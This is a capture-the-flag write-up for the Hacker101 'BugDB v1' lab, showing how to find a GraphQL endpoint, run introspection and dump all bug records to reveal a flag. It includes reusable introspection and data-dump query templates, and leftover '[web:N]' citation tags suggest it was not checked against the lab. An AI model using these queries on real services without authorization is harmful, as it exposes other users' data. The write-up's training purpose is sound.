# 🐞 BugDB v1

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Easy` &nbsp;|&nbsp; **Flags:** `1/1` ✅

---

## ⛓️ Attack Chain

```text
Find GraphQL endpoint → Enable/abuse introspection → Enumerate bug-related queries → Dump all bugs → Read flag from bug text
```

---

## 🔍 Application Overview

A simple bug tracker backed by a GraphQL API.  
The frontend talks to a single GraphQL endpoint and uses it to load bug data. Introspection is enabled and access control is weak, so any authenticated user can query all bugs and see the hidden flag.[web:10][web:12]

---

## 🚩 Flag — Over‑Permissive GraphQL Queries

**Step 1 — Locate the GraphQL endpoint**

1. Open the lab in your browser and intercept traffic (browser dev tools or Burp).  
2. Trigger some actions (view bugs, click around).  
3. Look for a `POST` request with JSON like:

   ```json
   {
     "query": "query ..."
   }
   ```

   usually sent to something like `/graphql` or `/api/graphql` — that is the GraphQL endpoint.[web:10][web:12]

---

**Step 2 — Run introspection to map the schema**

Send an introspection query to the same endpoint. Many tools have a built‑in “IntrospectionQuery”, but a minimal example is:

```graphql
{
  __schema {
    queryType {
      name
    }
    types {
      name
    }
  }
}
```

If the response returns a big JSON with lots of types, introspection is enabled and you can see all queryable objects and fields.[web:12]

---

**Step 3 — Identify bug-related queries and fields**

From the introspection result (or using a GraphQL UI):

1. Look at the `Query` type to see top‑level operations.  
2. Find anything related to bugs, such as:

   - `bugs`, `allBugs`, `bug`, etc.  
   - The bug type itself (e.g., `Bug`) and its fields.

3. Note important fields like `id`, `title`, `text`/`description`, `reporter`, `private`, etc. — these are potential places where the flag might be stored.[web:1][web:12]

---

**Step 4 — Dump all bugs**

Craft a query that asks for **all bugs** and the interesting fields. Adjust names to match the actual schema; a typical pattern is:

```graphql
{
  allBugs {
    id
    title
    text
    reporter {
      username
    }
  }
}
```

or:

```graphql
{
  bugs {
    id
    title
    description
  }
}
```

Send this to the GraphQL endpoint. Because BugDB v1 does not enforce proper authorization on this query, it returns every bug in the database, not just your own.[web:12][web:14]

---

**Step 5 — Extract the flag**

1. Look through the JSON response for any bug where the `text` / `description` field contains something that looks like a CTF flag.  
2. Copy that flag string and submit it on Hacker101 CTF to complete BugDB v1.[web:12][web:14]

---

## 🧠 Why It Works

| Vulnerability              | Root Cause                                                                 |
|---------------------------|----------------------------------------------------------------------------|
| Excessive data exposure   | Bug listing query returns all bugs for any user without proper restrictions |
| Introspection information | Full schema is exposed, making it easy to discover bug queries and fields   |
| Missing authorization     | Server never checks if the caller is allowed to see each bug                |

---

## 📋 Handy GraphQL Snippets

Minimal schema peek:

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

Example “dump bugs” template (adjust to real field names):

```graphql
{
  allBugs {
    id
    title
    text
  }
}
```
